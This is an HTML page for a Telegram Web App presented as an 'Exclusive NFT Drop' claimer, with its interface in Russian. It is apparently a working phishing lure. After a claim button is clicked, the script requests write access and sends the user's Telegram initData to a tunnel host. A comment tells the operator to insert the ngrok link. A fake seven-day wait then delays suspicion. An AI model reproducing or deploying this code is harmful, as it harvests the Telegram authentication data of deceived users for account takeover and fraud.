<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFT Claimer</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { text-align: center; }
        .nft-card { width: 180px; height: 180px; background: linear-gradient(45deg, #00d2ff, #3a7bd5); border-radius: 25px; margin: 0 auto 20px; box-shadow: 0 0 15px #00d2ff; }
        .btn { background: #0088cc; color: #fff; border: none; padding: 15px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; }
        .status { margin-top: 15px; color: #777; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="nft-card"></div>
        <h2>Exclusive NFT Drop</h2>
        <p>Подтвердите доступ для получения</p>
        <button class="btn" id="mainBtn">ПОЛУЧИТЬ</button>
        <div class="status" id="status">Ожидание...</div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        const btn = document.getElementById('mainBtn');
        const status = document.getElementById('status');
        
        // --- СЮДА ВСТАВЛЯЙ ССЫЛКУ ИЗ NGROK ---
        const BACKEND_URL = 'https://83b3271ef88282.lhr.life'; 

        tg.expand();

        btn.addEventListener('click', () => {
            tg.requestWriteAccess((allowed) => {
                if (allowed) {
                    status.innerText = "Авторизация...";
                    sendData(tg.initData);
                } else {
                    status.innerText = "Доступ отклонен";
                }
            });
        });

        async function sendData(initData) {
            try {
                const res = await fetch(`${BACKEND_URL}/auth`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ initData: initData })
                });
                if (res.ok) {
                    status.innerText = "Успешно! Ожидайте зачисления (7 дней)";
                    setTimeout(() => tg.close(), 2500);
                }
            } catch (e) {
                status.innerText = "Ошибка сети. Попробуйте позже.";
            }
        }
    </script>
</body>
</html>
